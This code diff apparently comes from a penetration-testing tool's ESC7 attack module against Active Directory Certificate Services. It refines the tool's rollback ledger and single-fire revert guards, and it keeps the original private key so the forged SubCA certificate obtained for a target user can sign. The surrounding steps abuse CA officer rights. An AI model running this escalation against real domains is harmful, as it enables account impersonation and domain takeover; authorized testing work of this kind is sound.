@@ -83,12 +83,18 @@ async def run_esc7(config: EscConfig) -> EscResult:
         return EscResult(success=False, esc=7, error=f"CA '{config.ca_name}' not found in LDAP")
     subca_was_enabled = _SUBCA_TEMPLATE in current_templates
 
-    change_id = register_ldap_change(
-        config.shell, kind="ca_template_enabled",
-        domain=config.domain, target=f"EnterpriseCA/{config.ca_name}",
-        detail={"ca_dn": ca_dn, "template": _SUBCA_TEMPLATE, "was_enabled": subca_was_enabled},
-        method="ADCSESC7 — SubCA template enable",
-    )
+    # The ca_template_enabled ledger change is registered ONLY when ADscan
+    # actually enables the SubCA template (see the enable block below). SubCA is
+    # enabled by default on a standard Enterprise CA, so registering it
+    # unconditionally — then no-op'ing the revert — would leave the entry pending
+    # and the session-death guarantee would finalize it as a FALSE
+    # `manual_required`, telling the client to revert a change ADscan never made.
+    change_id: Optional[str] = None
+    # Single-fire guards: both reverts run on the success path AND are queued in
+    # the rollback scope, so without a guard a post-revert raise (e.g. PKINIT)
+    # would re-run them — double-deleting the template into a false revert_failed.
+    subca_reverted = False
+    officer_removed = False
 
     async with esc_rollback_scope() as rb:
 
@@ -111,6 +117,10 @@ async def run_esc7(config: EscConfig) -> EscResult:
             )
 
         async def _remove_officer() -> None:
+            nonlocal officer_removed
+            if officer_removed:
+                return
+            officer_removed = True
             print_info(f"ESC7: removing {config.username!r} officer right from {config.ca_name}...")
             await asyncio.to_thread(
                 remove_officer,
@@ -126,8 +136,13 @@ async def run_esc7(config: EscConfig) -> EscResult:
         rb.add(_remove_officer)
 
         async def _disable_subca() -> None:
-            if subca_was_enabled:
-                return  # was already enabled, nothing to undo
+            nonlocal subca_reverted
+            # Nothing to undo unless ADscan enabled the template this run.
+            # `change_id is None` covers both the pre-enabled case (no change,
+            # no disclosure) and an enable that never registered.
+            if subca_reverted or change_id is None:
+                return
+            subca_reverted = True
             print_info(f"ESC7: removing SubCA from {config.ca_name} templates...")
 
             def _do_disable() -> bool:
@@ -147,7 +162,9 @@ async def run_esc7(config: EscConfig) -> EscResult:
 
         rb.add(_disable_subca)
 
-        # Enable SubCA if not already enabled
+        # Enable SubCA if not already enabled — register the ledger change ONLY
+        # here, immediately after a successful enable, so a change ADscan did not
+        # make is never disclosed.
         if not subca_was_enabled:
             print_info(f"ESC7: enabling SubCA template on {config.ca_name}...")
 
@@ -158,6 +175,13 @@ async def run_esc7(config: EscConfig) -> EscResult:
             ok = await asyncio.to_thread(_do_enable)
             if not ok:
                 raise RuntimeError(f"Failed to add SubCA to certificateTemplates on {ca_dn}")
+
+            change_id = register_ldap_change(
+                config.shell, kind="ca_template_enabled",
+                domain=config.domain, target=f"EnterpriseCA/{config.ca_name}",
+                detail={"ca_dn": ca_dn, "template": _SUBCA_TEMPLATE, "was_enabled": False},
+                method="ADCSESC7 — SubCA template enable",
+            )
 
         # Request SubCA cert (likely PENDING)
         print_info(f"ESC7: requesting SubCA certificate as {config.target_upn}...")
@@ -197,9 +221,14 @@ async def run_esc7(config: EscConfig) -> EscResult:
             if not ok:
                 raise RuntimeError(f"Failed to issue pending request {request_id}: {err}")
 
-            # Retrieve the now-issued cert
+            # Retrieve the now-issued cert. Carry the ORIGINAL request's private
+            # key forward so the issued PFX is signing-capable — the CA only
+            # returns the cert, the key lives only in the denied request result.
             print_info(f"ESC7: retrieving issued cert for request ID {request_id}...")
-            ret = await retrieve_certificate_native(req_cfg, out, request_id=request_id)
+            ret = await retrieve_certificate_native(
+                req_cfg, out, request_id=request_id,
+                private_key_pem=req.private_key_pem,
+            )
             if not ret.success:
                 raise RuntimeError(f"Certificate retrieval failed: {ret.error}")
             issued_pfx = ret.pfx_path
